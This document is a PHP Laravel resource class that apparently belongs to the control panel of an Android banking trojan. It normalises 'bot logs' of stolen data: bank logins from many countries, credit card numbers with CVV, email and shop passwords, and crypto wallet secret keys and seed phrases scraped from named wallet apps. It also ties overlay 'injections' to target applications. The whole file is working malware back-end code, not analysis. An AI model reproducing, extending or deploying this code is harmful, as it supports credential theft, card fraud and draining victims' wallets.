<?php

namespace App\Http\Resources\BotLog;

use App\Http\Resources\BaseResource;
use App\Models\Injection;
use Throwable;

class BotLogResource extends BaseResource
{
    public function toArray($request = null): array
    {
        $logs = $this->log;
        if (in_array($this->type, ['banks', 'credit_cards', 'crypt', 'shops', 'emails', 'wallets'])) {
            $logs = $request->get('withoutMappings') ? $this->mapLogs($this->log, $this->type) : $this->mapLogs($this->log, $this->type);
        } elseif($this->type === 'stealers') {
            switch($this->application) {
                case 'com.samourai.wallet':
                    $logs = ['phrase' => $logs['word_0']];
                    break;
                case 'org.toshi':
                    $logs = ['phrase' => implode(' ', $logs)];
                    break;
                case 'com.wallet.crypto.trustappt':
                case 'piuk.blockchain.android':
                    $logs = collect($logs)->filter(function($value, $key) {
                        return str_contains($key, "word_");
                    })->implode(" ");

                    $logs = ['phrase' => $logs];
                    break;
                case 'com.bitcoin.mwallet':
                    $logs = collect($logs)->filter(function($value, $key) {
                        return str_contains($key, "word_");
                    })->map(function($value) {
                        $value = preg_replace("/\d/", "", $value);
                        $value = str_replace(".", "", $value);
                        $value = iconv(mb_detect_encoding($value, mb_detect_order(), true), "UTF-8", $value);
                        return trim($value);
                    })->implode("");

                    $logs = ['phrase' => $logs];
                    break;
            }
        } elseif ($this->type === 'otheraccounts') {
            $log = collect($this->log);

            $applications = $log->pluck('type');
            $injections = Injection::select(['application', 'type'])->whereIn('application', $applications)->get();
            $injections = $injections->mapWithKeys(function (Injection $injection) {
                return [$injection->application => $injection->type];
            });

            $logs = [];
            foreach ($this->log as $log) {
                $application = $log['type'] ?? '';
                $image = isset($injections[$log['type']]) ? "injects/images/{$injections[$application]}/$application.png" : 'images/application_not_found.png';

                $logs[] = [
                    'account' => $log['name'] ?? '',
                    'application' => $application,
                    'image' => $image,
                ];
            }
        } elseif ($this->type === 'pushlist') {
            $logs = $this->log;
        } elseif ($this->type === 'applist') {
            $log = collect($this->log);

            $applications = $log->pluck('app');
            $injections = Injection::select(['application', 'type', 'name'])->whereIn('application', $applications)->get();
            $injections = $injections->mapWithKeys(function (Injection $injection) {
                return [
                    $injection->application => [
                        "type" => $injection->type,
                        "name" => $injection->name,
                    ]
                ];
            });

            $logs = [];
            foreach ($this->log as $log) {
                $application = $log['app'] ?? '';
                $image = isset($injections[$log['app']]) ? "injects/images/{$injections[$log['app']]['type']}/$application.png" : 'images/application_not_found.png';

                $logs[] = [
                    'application' => $application,
                    'image' => $image,
                    'name' => $injections[$application]['name'] ?? '-',
                ];
            }
        }

        return [
            'id' => $this->id,
            'bot_id' => $this->bot_id,
            'type' => $this->type,
            'application' => $this->application,
            'log' => $logs,
            'created_at' => $this->created_at?->format('Y-m-d H:i:s'),
            'updated_at' => $this->updated_at?->format('Y-m-d H:i:s'),
            'comment' => $this->comment,
        ];
    }

    private function mapLogs(array $log, string $type, bool $withoutAndroidFields = true): array
    {
        $androidFields = ['type_injects', 'closed'];

        $mappings = [
            'wallets' => [
                'paypallogin' => 'login',
                'login' => 'login',
                'Login' => 'login',
                'email' => 'login',
                'password' => 'password',
                'Password' => 'password',
                'Passwords' => 'password',
                'paypalpassword' => 'password',
                'code' => 'password',
                'holder_name' => 'name',
                'last_name' => 'surname',
            ],
            'shops' => [
                'login' => 'login',
                'email' => 'login',
                'password' => 'password',
            ],
            'crypt' => [
                'login' => 'login',
                'email' => 'login',
                'Login' => 'login',
                'Mnemonic' => 'login',
                'bip39' => 'password',
                'Password' => 'password',
                'password' => 'password',
                'key' => 'publicKey',
                'publicKey' => 'publicKey',
                'secretKey' => 'secretKey',
                'secret' => 'secretKey',
                'backup' => 'backupPhrase',
                'words' => 'backupPhrase',
                'pin' => 'pin',
            ],
            'emails' => [
                'email' => 'email',
                'password' => 'password',
                'surname' => 'surname',
                'name' => 'name',
            ],
            'credit_cards' => [
                'holderName' => 'holderName',
                'holder_name' => 'holderName',
                'Cardholder' => 'holderName',
                'last_name' => 'lastName',
                'surname' => 'lastName',
                'cvc' => 'CVV',
                'cvv' => 'CVV',
                'exp_mm' => 'expMM',
                'exp_yy' => 'expYY',
                'number_card' => 'cardNumber',
                '' => 'cardNumber',
                'cc' => 'cardNumber',
            ],
            'banks' => [
                'usuario' => 'login',
                'login' => 'login',
                'id' => 'login',
                'Login' => 'login',
                'loginKobi' => 'login',
                'user' => 'login',
                'User' => 'login',
                'datauser' => 'login',
                'loginBireysel' => 'login',
                'agencia' => 'login',
                'nutzerkennung' => 'login',
                'identyfikator' => 'login',
                'particulier_login' => 'login',
                'utente' => 'login',
                'codicecliente' => 'login',
                'pasport' => 'login',
                'haslo' => 'password',
                'particulier_password' => 'password',
                'Passwort' => 'password',
                'conta' => 'password',
                'passwordBireysel' => 'password',
                'passwordKobi' => 'password',
                'datapass' => 'password',
                'Pass' => 'password',
                'pass' => 'password',
                'password' => 'password',
                'clave' => 'password',
                'myinput' => 'password',
                'Passwort_wiederholen' => 'password',
            ],
        ];

        $mappedLog = [];

        try {
            $log = json_decode($log['data'], true, 512, JSON_THROW_ON_ERROR);
        } catch (Throwable) {
        }

        foreach ($log as $field => $value) {
            if (isset($mappings[$type][$field])) {
                $mappedLog[$mappings[$type][$field]] = $value;
            } else {
                if ($withoutAndroidFields && in_array($field, $androidFields, true)) {
                    continue;
                }
                $mappedLog['additional'][$field] = $value;
            }
        }

        return $mappedLog;
    }

}
